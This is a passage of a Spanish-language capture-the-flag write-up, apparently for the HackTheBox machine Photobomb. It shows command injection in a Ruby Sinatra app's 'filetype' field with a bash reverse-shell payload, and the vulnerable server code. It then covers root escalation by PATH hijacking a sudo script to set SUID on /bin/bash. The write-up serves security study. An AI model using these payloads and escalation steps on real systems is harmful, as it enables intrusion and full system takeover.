class="s">"mark-mc-neill-4xWHIpY2QcY-unsplash.jpg"</span> <span class="na">style=</span><span class="s">"background-image: url(ui_images/mark-mc-neill-4xWHIpY2QcY-unsplash.jpg)"</span><span class="nt">&gt;&lt;/label&gt;&lt;input</span> <span class="na">type=</span><span class="s">"radio"</span> <span class="na">name=</span><span class="s">"photo"</span> <span class="na">value=</span><span class="s">"wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg"</span> <span class="na">id=</span><span class="s">"wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg"</span><span class="nt">/&gt;&lt;label</span> <span class="na">for=</span><span class="s">"wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg"</span> <span class="na">style=</span><span class="s">"background-image: url(ui_images/wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg)"</span><span class="nt">&gt;&lt;/label&gt;</span>
      <span class="nt">&lt;/fieldset&gt;</span>
      <span class="nt">&lt;fieldset</span> <span class="na">id=</span><span class="s">"image-settings"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;label</span> <span class="na">for=</span><span class="s">"filetype"</span><span class="nt">&gt;</span>File type<span class="nt">&lt;/label&gt;</span>
      <span class="nt">&lt;select</span> <span class="na">name=</span><span class="s">"filetype"</span> <span class="na">title=</span><span class="s">"JPGs work on most printers, but some people think PNGs give better quality"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;option</span> <span class="na">value=</span><span class="s">"jpg"</span><span class="nt">&gt;</span>JPG<span class="nt">&lt;/option&gt;</span>
        <span class="nt">&lt;option</span> <span class="na">value=</span><span class="s">"png"</span><span class="nt">&gt;</span>PNG<span class="nt">&lt;/option&gt;</span>
        <span class="nt">&lt;/select&gt;</span>
      <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"product-list"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"radio"</span> <span class="na">name=</span><span class="s">"dimensions"</span> <span class="na">value=</span><span class="s">"3000x2000"</span> <span class="na">id=</span><span class="s">"3000x2000"</span> <span class="na">checked=</span><span class="s">"checked"</span><span class="nt">/&gt;&lt;label</span> <span class="na">for=</span><span class="s">"3000x2000"</span><span class="nt">&gt;</span>3000x2000 - mousemat<span class="nt">&lt;/label&gt;</span>
        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"radio"</span> <span class="na">name=</span><span class="s">"dimensions"</span> <span class="na">value=</span><span class="s">"1000x1500"</span> <span class="na">id=</span><span class="s">"1000x1500"</span><span class="nt">/&gt;&lt;label</span> <span class="na">for=</span><span class="s">"1000x1500"</span><span class="nt">&gt;</span>1000x1500 - mug<span class="nt">&lt;/label&gt;</span>
        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"radio"</span> <span class="na">name=</span><span class="s">"dimensions"</span> <span class="na">value=</span><span class="s">"600x400"</span> <span class="na">id=</span><span class="s">"600x400"</span><span class="nt">/&gt;&lt;label</span> <span class="na">for=</span><span class="s">"600x400"</span><span class="nt">&gt;</span>600x400 - phone cover<span class="nt">&lt;/label&gt;</span>
        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"radio"</span> <span class="na">name=</span><span class="s">"dimensions"</span> <span class="na">value=</span><span class="s">"300x200"</span> <span class="na">id=</span><span class="s">"300x200"</span><span class="nt">/&gt;&lt;label</span> <span class="na">for=</span><span class="s">"300x200"</span><span class="nt">&gt;</span>300x200 - keyring<span class="nt">&lt;/label&gt;</span>
        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"radio"</span> <span class="na">name=</span><span class="s">"dimensions"</span> <span class="na">value=</span><span class="s">"150x100"</span> <span class="na">id=</span><span class="s">"150x100"</span><span class="nt">/&gt;&lt;label</span> <span class="na">for=</span><span class="s">"150x100"</span><span class="nt">&gt;</span>150x100 - usb stick<span class="nt">&lt;/label&gt;</span>
        <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"radio"</span> <span class="na">name=</span><span class="s">"dimensions"</span> <span class="na">value=</span><span class="s">"30x20"</span> <span class="na">id=</span><span class="s">"30x20"</span><span class="nt">/&gt;&lt;label</span> <span class="na">for=</span><span class="s">"30x20"</span><span class="nt">&gt;</span>30x20 - micro SD card<span class="nt">&lt;/label&gt;</span>
      <span class="nt">&lt;/div&gt;</span>
      <span class="nt">&lt;/fieldset&gt;</span>
      <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"controls"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;button</span> <span class="na">type=</span><span class="s">"submit"</span><span class="nt">&gt;</span>download photo to print<span class="nt">&lt;/button&gt;</span>
      <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;/form&gt;</span>
  <span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</pre></table></code></div></div><h2 id="ejecutando-comandos-command-injection"><span class="mr-2">Ejecutando comandos (Command Injection)</span><a href="#ejecutando-comandos-command-injection" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Cuando analizamos la petición con <strong>Burp Suite</strong>, encontramos los parámetros enviados en el formulario visto anteriormente. Hice modificaciones en el valor de <em>filetype</em>, comenzando con un punto y coma para revisar la reacción, lo que sucedió fue que el servidor me devolvió un error 500.</p><p>Llegado a cierto punto intenté inyectar un comando de consola, pero no recibía respuesta, así que envié una traza ICMP a mi máquina y esperé a que apareciera con <em>tshark</em> <code class="language-plaintext highlighter-rouge">ping+-c+1+10.10.14.73</code>:</p><h3 id="tshark"><span class="mr-2">tshark</span><a href="#tshark" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="nb">sudo </span>tshark <span class="nt">--color</span> <span class="nt">-nni</span> any icmp
Capturing on <span class="s1">'any'</span>
 <span class="k">**</span> <span class="o">(</span>tshark:10598<span class="o">)</span> 00:46:00.576112 <span class="o">[</span>Main MESSAGE] <span class="nt">--</span> Capture started.
 <span class="k">**</span> <span class="o">(</span>tshark:10598<span class="o">)</span> 00:46:00.576211 <span class="o">[</span>Main MESSAGE] <span class="nt">--</span> File: <span class="s2">"/tmp/wireshark_anyXF07V1.pcapng"</span>
    1 0.000000000  10.10.14.73 → 10.10.14.73  ICMP 100 Echo <span class="o">(</span>ping<span class="o">)</span> request  <span class="nb">id</span><span class="o">=</span>0x000a, <span class="nb">seq</span><span class="o">=</span>1/256, <span class="nv">ttl</span><span class="o">=</span>64
    2 0.000022668  10.10.14.73 → 10.10.14.73  ICMP 100 Echo <span class="o">(</span>ping<span class="o">)</span> reply    <span class="nb">id</span><span class="o">=</span>0x000a, <span class="nb">seq</span><span class="o">=</span>1/256, <span class="nv">ttl</span><span class="o">=</span>64 <span class="o">(</span>request <span class="k">in </span>1<span class="o">)</span>
    3 30.026726631 10.10.11.182 → 10.10.14.73  ICMP 100 Echo <span class="o">(</span>ping<span class="o">)</span> request  <span class="nb">id</span><span class="o">=</span>0x0003, <span class="nb">seq</span><span class="o">=</span>1/256, <span class="nv">ttl</span><span class="o">=</span>63
    4 30.026761095  10.10.14.73 → 10.10.11.182 ICMP 100 Echo <span class="o">(</span>ping<span class="o">)</span> reply    <span class="nb">id</span><span class="o">=</span>0x0003, <span class="nb">seq</span><span class="o">=</span>1/256, <span class="nv">ttl</span><span class="o">=</span>64 <span class="o">(</span>request <span class="k">in </span>3<span class="o">)</span>
^C4 packets captured
</pre></table></code></div></div><p>Obtuvimos respuesta de la máquina, así que está ejecutando comandos. Procedemos a conectarnos a la máquina víctima por medio de una shell inversa, en mi caso he usado la siguiente carga útil <code class="language-plaintext highlighter-rouge">png;bash+-c+'bash+-i+&gt;%26+/dev/tcp/10.10.14.73/4434+0&gt;%261</code>:</p><h2 id="obteniendo-una-shell-como-wizard"><span class="mr-2">Obteniendo una shell como wizard</span><a href="#obteniendo-una-shell-como-wizard" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><img data-src="/assets/favicon/2023-02-11/photobomb5.png" alt="BurpSuite photobomb petición" data-proofer-ignore></p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>nc <span class="nt">-nlvp</span> 4434           
Listening on 0.0.0.0 4434
Connection received on 10.10.11.182 50650
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>732<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
wizard@photobomb:~/photobomb<span class="err">$</span>
</pre></table></code></div></div><p>Obtenemos acceso. Realizamos el tratamiento de la tty y comenzamos a enumerar el sistema como el usuario wizard.</p><h2 id="analizando-código-ruby-de-servicio-web"><span class="mr-2">Analizando código ruby de servicio web</span><a href="#analizando-código-ruby-de-servicio-web" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Vamos a ver cómo se está ejecutando el aplicativo para revisar el porqué nos permite inyectar comandos, el siguiente código está en el archivo <code class="language-plaintext highlighter-rouge">server.rb</code>:</p><div class="language-ruby highlighter-rouge"><div class="code-header"> <span data-label-text="Ruby"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
</pre><td class="rouge-code"><pre><span class="nb">require</span> <span class="s1">'sinatra'</span>

<span class="n">set</span> <span class="ss">:public_folder</span><span class="p">,</span> <span class="s1">'public'</span>

<span class="n">get</span> <span class="s1">'/'</span> <span class="k">do</span>

  <span class="n">html</span> <span class="o">=</span> <span class="o">&lt;&lt;~</span><span class="no">HTML</span><span class="sh">
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
  &lt;title&gt;Photobomb&lt;/title&gt;
  &lt;link type="text/css" rel="stylesheet" href="styles.css" media="all" /&gt;
  &lt;script src="photobomb.js"&gt;&lt;/script&gt;
&lt;/head&gt;
&lt;body&gt;
  &lt;div id="container"&gt;
    &lt;header&gt;
      &lt;h1&gt;&lt;a href="/"&gt;Photobomb&lt;/a&gt;&lt;/h1&gt;
    &lt;/header&gt;
    &lt;article&gt;
      &lt;h2&gt;Welcome to your new Photobomb franchise!&lt;/h2&gt;
      &lt;p&gt;You will soon be making an amazing income selling premium photographic gifts.&lt;/p&gt;
      &lt;p&gt;This state of-the-art web application is your gateway to this fantastic new life. Your wish is its command.&lt;/p&gt;
      &lt;p&gt;To get started, please &lt;a href="/printer" class="creds"&gt;click here!&lt;/a&gt; (the credentials are in your welcome pack).&lt;/p&gt;
      &lt;p&gt;If you have any problems with your printer, please call our Technical Support team on 4 4283 77468377.&lt;/p&gt;
    &lt;/article&gt;
  &lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
</span><span class="no">HTML</span>

  <span class="n">content_type</span> <span class="ss">:html</span>
  <span class="k">return</span> <span class="n">html</span>
<span class="k">end</span>

<span class="n">get</span> <span class="s1">'/printer'</span> <span class="k">do</span>

  <span class="n">images</span> <span class="o">=</span> <span class="s1">''</span>
  <span class="n">checked</span> <span class="o">=</span> <span class="s1">' checked="checked" '</span>
  <span class="no">Dir</span><span class="p">.</span><span class="nf">glob</span><span class="p">(</span><span class="s1">'public/ui_images/*.jpg'</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">jpg_filename</span><span class="o">|</span>
    <span class="n">img_src</span> <span class="o">=</span> <span class="n">jpg_filename</span><span class="p">.</span><span class="nf">sub</span><span class="p">(</span><span class="s1">'public/'</span><span class="p">,</span> <span class="s1">''</span><span class="p">)</span>
    <span class="n">img_name</span> <span class="o">=</span> <span class="n">jpg_filename</span><span class="p">.</span><span class="nf">sub</span><span class="p">(</span><span class="s1">'public/ui_images/'</span><span class="p">,</span> <span class="s1">''</span><span class="p">)</span>
    <span class="n">images</span> <span class="o">+=</span> <span class="s1">'&lt;input type="radio" name="photo" value="'</span> <span class="o">+</span> <span class="n">img_name</span> <span class="o">+</span> <span class="s1">'" id="'</span> <span class="o">+</span> <span class="n">img_name</span> <span class="o">+</span> <span class="s1">'"'</span> <span class="o">+</span> <span class="n">checked</span> <span class="o">+</span> <span class="s1">'/&gt;&lt;label for="'</span> <span class="o">+</span> <span class="n">img_name</span> <span class="o">+</span> <span class="s1">'" style="background-image: url('</span> <span class="o">+</span> <span class="n">img_src</span> <span class="o">+</span> <span class="s1">')"&gt;&lt;/label&gt;'</span>
    <span class="n">checked</span> <span class="o">=</span> <span class="s1">''</span>
  <span class="k">end</span>

  <span class="n">html</span> <span class="o">=</span> <span class="o">&lt;&lt;~</span><span class="no">HTML</span><span class="sh">
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
  &lt;title&gt;Photobomb&lt;/title&gt;
  &lt;link type="text/css" rel="stylesheet" href="styles.css" media="all" /&gt;
&lt;/head&gt;
&lt;body&gt;
  &lt;div id="container"&gt;
    &lt;header&gt;
      &lt;h1&gt;&lt;a href="/"&gt;Photobomb&lt;/a&gt;&lt;/h1&gt;
    &lt;/header&gt;
    &lt;form id="photo-form" action="/printer" method="post"&gt;
      &lt;h3&gt;Select an image&lt;/h3&gt;
      &lt;fieldset id="image-wrapper"&gt;
      </span><span class="si">#{</span><span class="n">images</span><span class="si">}</span><span class="sh">
      &lt;/fieldset&gt;
      &lt;fieldset id="image-settings"&gt;
      &lt;label for="filetype"&gt;File type&lt;/label&gt;
      &lt;select name="filetype" title="JPGs work on most printers, but some people think PNGs give better quality"&gt;
        &lt;option value="jpg"&gt;JPG&lt;/option&gt;
        &lt;option value="png"&gt;PNG&lt;/option&gt;
        &lt;/select&gt;
      &lt;div class="product-list"&gt;
        &lt;input type="radio" name="dimensions" value="3000x2000" id="3000x2000" checked="checked"/&gt;&lt;label for="3000x2000"&gt;3000x2000 - mousemat&lt;/label&gt;
        &lt;input type="radio" name="dimensions" value="1000x1500" id="1000x1500"/&gt;&lt;label for="1000x1500"&gt;1000x1500 - mug&lt;/label&gt;
        &lt;input type="radio" name="dimensions" value="600x400" id="600x400"/&gt;&lt;label for="600x400"&gt;600x400 - phone cover&lt;/label&gt;
        &lt;input type="radio" name="dimensions" value="300x200" id="300x200"/&gt;&lt;label for="300x200"&gt;300x200 - keyring&lt;/label&gt;
        &lt;input type="radio" name="dimensions" value="150x100" id="150x100"/&gt;&lt;label for="150x100"&gt;150x100 - usb stick&lt;/label&gt;
        &lt;input type="radio" name="dimensions" value="30x20" id="30x20"/&gt;&lt;label for="30x20"&gt;30x20 - micro SD card&lt;/label&gt;
      &lt;/div&gt;
      &lt;/fieldset&gt;
      &lt;div class="controls"&gt;
        &lt;button type="submit"&gt;download photo to print&lt;/button&gt;
      &lt;/div&gt;
    &lt;/form&gt;
  &lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
</span><span class="no">HTML</span>

  <span class="n">content_type</span> <span class="ss">:html</span>
  <span class="k">return</span> <span class="n">html</span>
<span class="k">end</span>

<span class="n">post</span> <span class="s1">'/printer'</span> <span class="k">do</span>
  <span class="n">photo</span> <span class="o">=</span> <span class="n">params</span><span class="p">[</span><span class="ss">:photo</span><span class="p">]</span>
  <span class="n">filetype</span> <span class="o">=</span> <span class="n">params</span><span class="p">[</span><span class="ss">:filetype</span><span class="p">]</span>
  <span class="n">dimensions</span> <span class="o">=</span> <span class="n">params</span><span class="p">[</span><span class="ss">:dimensions</span><span class="p">]</span>

  <span class="c1"># handle inputs</span>
  <span class="k">if</span> <span class="n">photo</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/\.{2}|\//</span><span class="p">)</span>
    <span class="n">halt</span> <span class="mi">500</span><span class="p">,</span> <span class="s1">'Invalid photo.'</span>
  <span class="k">end</span>

  <span class="k">if</span> <span class="o">!</span><span class="no">FileTest</span><span class="p">.</span><span class="nf">exist?</span><span class="p">(</span> <span class="s2">"source_images/"</span> <span class="o">+</span> <span class="n">photo</span> <span class="p">)</span>
    <span class="n">halt</span> <span class="mi">500</span><span class="p">,</span> <span class="s1">'Source photo does not exist.'</span>
  <span class="k">end</span>

  <span class="k">if</span> <span class="o">!</span><span class="n">filetype</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/^(png|jpg)/</span><span class="p">)</span>
    <span class="n">halt</span> <span class="mi">500</span><span class="p">,</span> <span class="s1">'Invalid filetype.'</span>
  <span class="k">end</span>

  <span class="k">if</span> <span class="o">!</span><span class="n">dimensions</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/^[0-9]+x[0-9]+$/</span><span class="p">)</span>
    <span class="n">halt</span> <span class="mi">500</span><span class="p">,</span> <span class="s1">'Invalid dimensions.'</span>
  <span class="k">end</span>

  <span class="k">case</span> <span class="n">filetype</span>
  <span class="k">when</span> <span class="s1">'png'</span>
    <span class="n">content_type</span> <span class="s1">'image/png'</span>
  <span class="k">when</span> <span class="s1">'jpg'</span>
    <span class="n">content_type</span> <span class="s1">'image/jpeg'</span>
  <span class="k">end</span>

  <span class="n">filename</span> <span class="o">=</span> <span class="n">photo</span><span class="p">.</span><span class="nf">sub</span><span class="p">(</span><span class="s1">'.jpg'</span><span class="p">,</span> <span class="s1">''</span><span class="p">)</span> <span class="o">+</span> <span class="s1">'_'</span> <span class="o">+</span> <span class="n">dimensions</span> <span class="o">+</span> <span class="s1">'.'</span> <span class="o">+</span> <span class="n">filetype</span>
  <span class="n">response</span><span class="p">[</span><span class="s1">'Content-Disposition'</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"attachment; filename=</span><span class="si">#{</span><span class="n">filename</span><span class="si">}</span><span class="s2">"</span>

  <span class="k">if</span> <span class="o">!</span><span class="no">File</span><span class="p">.</span><span class="nf">exists?</span><span class="p">(</span><span class="s1">'resized_images/'</span> <span class="o">+</span> <span class="n">filename</span><span class="p">)</span>
    <span class="n">command</span> <span class="o">=</span> <span class="s1">'convert source_images/'</span> <span class="o">+</span> <span class="n">photo</span> <span class="o">+</span> <span class="s1">' -resize '</span> <span class="o">+</span> <span class="n">dimensions</span> <span class="o">+</span> <span class="s1">' resized_images/'</span> <span class="o">+</span> <span class="n">filename</span>
    <span class="nb">puts</span> <span class="s2">"Executing: </span><span class="si">#{</span><span class="n">command</span><span class="si">}</span><span class="s2">"</span>
    <span class="nb">system</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
  <span class="k">else</span>
    <span class="nb">puts</span> <span class="s2">"File already exists."</span>
  <span class="k">end</span>

  <span class="k">if</span> <span class="no">File</span><span class="p">.</span><span class="nf">exists?</span><span class="p">(</span><span class="s1">'resized_images/'</span> <span class="o">+</span> <span class="n">filename</span><span class="p">)</span>
    <span class="n">halt</span> <span class="mi">200</span><span class="p">,</span> <span class="p">{},</span> <span class="no">IO</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="s1">'resized_images/'</span> <span class="o">+</span> <span class="n">filename</span><span class="p">)</span>
  <span class="k">end</span>

  <span class="c1">#message = 'Failed to generate a copy of ' + photo + ' resized to ' + dimensions + ' with filetype ' + filetype</span>
  <span class="n">message</span> <span class="o">=</span> <span class="s1">'Failed to generate a copy of '</span> <span class="o">+</span> <span class="n">photo</span>
  <span class="n">halt</span> <span class="mi">500</span><span class="p">,</span> <span class="n">message</span>
<span class="k">end</span>
</pre></table></code></div></div><p>Vemos que para la validación en el atributo “filetype” debe comenzar ya sea con “jpg” o “png” con una expresión regular. Lo que hay después, lo ignora o no lo valida, por ello podemos inyectar comandos. Además, hay una línea donde ejecuta directamente lo que hay en la cadena del atributo “filetype”, así que usar “;” nos permite inyectar un nuevo comando como parte de la misma línea.</p><h2 id="escalando-privilegios"><span class="mr-2">Escalando privilegios</span><a href="#escalando-privilegios" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Primeramente ejecutamos el comando <code class="language-plaintext highlighter-rouge">sudo -l</code> para revisar los permisos a nivel de sudoers (dentro del archivo sudoers), y así ver si nos han asignado alguno:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>wizard@photobomb:~/photobomb<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>wizard on photobomb:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User wizard may run the following commands on photobomb:
    <span class="o">(</span>root<span class="o">)</span> SETENV: NOPASSWD: /opt/cleanup.sh
wizard@photobomb:~/photobomb<span class="err">$</span>
</pre></table></code></div></div><p>Podemos cambiar las variables de entorno y ejecutar el script <code class="language-plaintext highlighter-rouge">cleanup.sh</code>.</p><h2 id="analizando-código-y-secuestro-del-path"><span class="mr-2">Analizando código y secuestro del path</span><a href="#analizando-código-y-secuestro-del-path" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Veamos qué tiene el archivo:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>wizard@photobomb:~/photobomb<span class="nv">$ </span><span class="nb">cat</span> /opt/cleanup.sh 
<span class="c">#!/bin/bash</span>
./opt/.bashrc
<span class="nb">cd</span> /home/wizard/photobomb

<span class="c"># clean up log files</span>
<span class="k">if</span> <span class="o">[</span> <span class="nt">-s</span> log/photobomb.log <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="o">!</span> <span class="o">[</span> <span class="nt">-L</span> log/photobomb.log <span class="o">]</span>
<span class="k">then</span>
  /bin/cat log/photobomb.log <span class="o">&gt;</span> log/photobomb.log.old
  /usr/bin/truncate <span class="nt">-s0</span> log/photobomb.log
<span class="k">fi</span>

<span class="c"># protect the priceless originals</span>
find source_images <span class="nt">-type</span> f <span class="nt">-name</span> <span class="s1">'*.jpg'</span> <span class="nt">-exec</span> <span class="nb">chown </span>root:root <span class="o">{}</span> <span class="se">\;</span>
wizard@photobomb:~/photobomb<span class="err">$</span>
</pre></table></code></div></div><p>Hay algo que llama bastante la atención, el comando <code class="language-plaintext highlighter-rouge">find</code> no tiene ruta absoluta, así que esto nos indica que podemos hacer un secuestro del path y ejecutar comandos arbitrarios como el usuario root (teniendo en cuenta también los permisos asignados):</p><p>Nos desplazamos a la ruta <code class="language-plaintext highlighter-rouge">tmp</code>, creamos un nuevo archivo llamado <code class="language-plaintext highlighter-rouge">find</code> (como el comando), dentro de él escribimos la instrucción que queremos ejecutar una vez se procese el archivo <code class="language-plaintext highlighter-rouge">/opt/cleanup.sh</code> llegado al punto de ejecutar el comando <code class="language-plaintext highlighter-rouge">find</code> dentro de él. Le damos todos los permisos (777), actualizamos el <code class="language-plaintext highlighter-rouge">PATH</code> con nuestra nueva ruta donde estará nuestro archivo malicioso (<code class="language-plaintext highlighter-rouge">/tmp</code>) y ejecutamos el comando que nos han asignado a nivel de <code class="language-plaintext highlighter-rouge">sudoers</code> como <code class="language-plaintext highlighter-rouge">sudo</code>. Es decir <code class="language-plaintext highlighter-rouge">/opt/cleanup.sh</code>. Revisamos el <code class="language-plaintext highlighter-rouge">UID</code> del binario <code class="language-plaintext highlighter-rouge">/bin/bash</code> para asegurarnos que todo ha salido bien. Tiene el permiso <code class="language-plaintext highlighter-rouge">s</code>. El documento lo podemos ejecutar como superusuario:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>wizard@photobomb:~/photobomb<span class="nv">$ </span><span class="nb">cd</span> /tmp
wizard@photobomb:/tmp<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'chmod u+s /bin/bash'</span> <span class="o">&gt;</span> find
wizard@photobomb:/tmp<span class="nv">$ </span><span class="nb">chmod </span>777 find
wizard@photobomb:/tmp<span class="nv">$ </span><span class="nb">sudo </span><span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span> /opt/cleanup.sh
wizard@photobomb:/tmp<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /bin/bash
<span class="nt">-rwsr-xr-x</span> 1 root root 1183448 Apr 18  2022 /bin/bash
wizard@photobomb:/tmp<span class="err">$</span>
</pre></table></code></div></div><p>Ejecutamos el binario <code class="language-plaintext highlighter-rouge">/bin/bash</code> con el parámetro <code class="language-plaintext highlighter-rouge">-p</code>, el cual nos indica que vamos a iniciar sesión interactiva con una shell Bash con permisos de superusuario:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>wizard@photobomb:/tmp<span class="nv">$ </span>/bin/bash <span class="nt">-p</span>
bash-5.0<span class="se">\#</span> <span class="nb">whoami
</span>root
bash-5.0<span class="se">\#</span>
</pre></table></code></div></div><p>¡Happy Hacking!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a>, <a href='/categories/writeup/'>Writeup</a>, <a href='/categories/machines/'>Machines</a>, <a href='/categories/linux/'>Linux</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ruby/" class="post-tag no-text-decoration" >ruby</a> <a href="/tags/command-injection/" class="post-tag no-text-decoration" >command-injection</a> <a href="/tags/sinatra/" class="post-tag no-text-decoration" >sinatra</a> <a href="/tags/burpsuite/" class="post-tag no-text-decoration" >BurpSuite</a> <a href="/tags/path-hijacking/" class="post-tag no-text-decoration" >PATH-Hijacking</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> Esta entrada está licenciada bajo <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> por el autor.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Compartir</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Writeup+Photobomb+HTB+-+rabb1t&url=https%3A%2F%2Frabb1t-0.github.io%2Fposts%2FWriteUp-Photobomb-HTB%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Writeup+Photobomb+HTB+-+rabb1t&u=https%3A%2F%2Frabb1t-0.github.io%2Fposts%2FWriteUp-Photobomb-HTB%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Frabb1t-0.github.io%2Fposts%2FWriteUp-Photobomb-HTB%2F&text=Writeup+Photobomb+HTB+-+rabb1t" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copiar enlace" data-title-succeed="¡Enlace copiado!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Actualizado recientemente</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/burpsuite-socks/">Socks y BurpSuite</a><li><a href="/posts/WriteUp-Undetected-HTB/">WriteUp Undetected HTB</a><li><a href="/posts/WriteUp-Late-HTB/">WriteUp Late HTB</a><li><a 